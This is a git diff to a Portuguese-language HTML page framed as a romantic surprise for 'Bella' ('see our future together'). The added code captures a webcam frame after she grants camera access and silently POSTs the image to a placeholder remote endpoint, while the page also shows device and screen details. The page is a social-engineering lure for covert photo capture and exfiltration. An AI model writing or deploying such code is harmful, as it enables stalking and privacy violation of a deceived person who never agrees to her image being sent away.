@@ -20,11 +20,18 @@
         font-size: 1.2rem;
         border-radius: 8px;
         cursor: pointer;
+        margin: 0.5rem;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
       }
       video {
         margin-top: 2rem;
         width: 300px;
+        border-radius: 12px;
+        display: none;
+      }
+      img {
+        margin-top: 1rem;
+        max-width: 300px;
         border-radius: 12px;
         display: none;
       }
@@ -38,18 +45,24 @@
   <body>
     <h1>Bella, veja o nosso futuro juntos 💖</h1>
     <p>Esse momento vai mostrar que o destino uniu nossos corações.</p>
+
     <button onclick="iniciarMagia()">Ver o Futuro ✨</button>
+    <button onclick="capturarFoto()">Capturar Foto 📷</button>
 
     <video id="camera" autoplay playsinline></video>
+    <img id="foto-capturada" />
 
     <div class="info" id="info"></div>
 
     <script>
+      let videoStream = null;
+
       async function iniciarMagia() {
         const video = document.getElementById("camera");
+
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          video.srcObject = stream;
+          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = videoStream;
           video.style.display = "block";
         } catch (err) {
           alert("Você precisa permitir a câmera para ver nosso futuro, meu amor 😢");
@@ -66,6 +79,28 @@
           <strong>Resolução da Tela:</strong> ${window.screen.width}x${window.screen.height}<br>
           <strong>Data:</strong> ${new Date().toLocaleString()}
         `;
+      }
+
+      function capturarFoto() {
+        const video = document.getElementById("camera");
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL("image/jpeg");
+        const img = document.getElementById("foto-capturada");
+        img.src = dataUrl;
+        img.style.display = "block";
+
+        fetch("https://SEU-ENDPOINT-AQUI/upload", {
+          method: "POST",
+          body: JSON.stringify({ imagem: dataUrl }),
+          headers: { "Content-Type": "application/json" }
+        })
+        .then(res => console.log("Imagem enviada com sucesso"))
+        .catch(err => console.error("Erro ao enviar imagem:", err));
       }
     </script>
   </body>
